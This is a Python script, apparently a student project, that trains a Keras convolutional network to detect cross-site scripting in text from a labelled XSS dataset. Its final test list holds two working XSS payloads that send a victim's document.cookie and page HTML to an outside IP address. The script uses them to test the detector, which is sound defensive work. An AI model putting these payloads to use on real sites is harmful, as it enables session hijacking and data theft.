#Aierken shalayiding
import numpy as np
import pandas as pd
from sklearn.model_selection import train_test_split
import os
import matplotlib.pyplot as plt
import tensorflow as tf
from tensorflow import keras

def convert_to_ascii(input_data): # conver the cahr to ascii number to insert to network
    input_data_to_char=[]
    for i in input_data:
        input_data_to_char.append(ord(i)) # convert to ascii 
    Zero_array=np.zeros((400))
    indexs = min(len(input_data_to_char),400)  # keep size with 100 overloard!!
    for i in range(indexs):
        Zero_array[i]=input_data_to_char[i]
    Zero_array.shape=(20, 20) #reshape the array to matrix 
    return Zero_array 


def check_right_wrong(pred_value,testY): # check which one is correct from the prediction percentage
    
    for i in range(len(pred_value)):
        if pred_value[i]>0.5:
            pred_value[i]=1
        elif pred_value[i]<=0.5:
            pred_value[i]=0
    true=0
    false=0
    for i in range(len(pred_value)):    #count the correct and incorrect ones
        if pred_value[i] == testY[i]:
            true+=1
        else:
            false+=1
    return true,false




def show_plot_history(history): #use keras model to generate matplot
    
    # recive data from the model 
    accuracy = history.history['accuracy'] 
    loss = history.history['loss']
    x = range(1, len(accuracy) + 1)
    val_accuracy = history.history['val_accuracy']
    val_loss = history.history['val_loss']


    # create figure and insert the data point 
    plt.figure(figsize=(14, 6))
    plt.subplot(1, 2, 1)
    plt.plot(x, accuracy, 'g', label='Model Training accuracy')
    plt.plot(x, val_accuracy, 'r', label='Model Validation accuracy')
    plt.title('Model Training and validation accuracy')
    plt.legend()
    plt.subplot(1, 2, 2)
    plt.plot(x, loss, 'g', label='Model Training loss')
    plt.plot(x, val_loss, 'r', label='Model Validation loss')
    plt.title('Model Training and validation loss')
    plt.legend()
    plt.savefig('Model_Training_Validation_Accuracy(Loss).png')



df=pd.read_csv('XSS_dataset_mixed.csv', encoding='utf-8-sig') # read the file 



samples_size = 800 # difind sample size for different test 
df=df[df.columns[-2:]]
sentences=df['Sentence'][:samples_size].values
ascii_sentences = np.zeros((len(sentences),20,20)) # ascii convertion 
for i in range(len(sentences)):
    ascii_sentences[i] = convert_to_ascii(sentences[i])


# split the data to test_size with  shuffle rate 42 
trainX, testX, trainY, testY = train_test_split(ascii_sentences,df['Label'][:samples_size].values, test_size=0.4,random_state=42)



with tf.device("gpu:0"): # use gpu if possible 


    model=tf.keras.models.Sequential([ # different layer is been applied to models 
        tf.keras.layers.Conv2D(128,(3,3), activation=tf.nn.relu, input_shape=(20,20,1)),
        tf.keras.layers.Flatten(), # inorder to achive the shape match 
        # --------------------------layer -------------------------------------
        tf.keras.layers.Dense(128, activation='relu'),
        tf.keras.layers.Dense(64, activation='relu'),
        tf.keras.layers.Dense(32, activation='relu'),
        tf.keras.layers.Dense(16, activation='relu'),
        tf.keras.layers.Dense(8, activation='relu'),
        tf.keras.layers.Dense(1, activation='sigmoid')
    ])


    # binary classification is used
    model.compile(loss='binary_crossentropy', 
                optimizer='adam',  # adam optimizer is giving best result
                metrics=['accuracy'])
    model.summary()
    batch_size = 1
    num_epoch = 5

    model_log = model.fit(trainX, trainY, #keep model_log for later graph process
            batch_size=batch_size,
            verbose=False,
            epochs=num_epoch)

    pred=model.predict(testX) # predic the testX new sample with train model

    
    right,wrong =check_right_wrong(pred,testY)
    print('Total number of test data ',right+wrong)
    print('Total number of correct prediction',right)
    print('Total number of incorrect prediction',wrong)
    print('Accuracy for test data set',right/(right+wrong) *100)
    #show_plot_history(model_log)
    test = ['?name=<script>new Image().src="https:// 192.165.159.122/fakepg.php?output="+document.cookie;</script>',
    '<script>new Image().src="https://192.165.159.122/ fakepg.php?output="+document.body.innerHTML</script>']
    ascii_test = np.zeros((len(test),20,20))
    for i in range(len(test)):
        ascii_test[i]= convert_to_ascii(test[i])
    
    print(model.predict(ascii_test))



        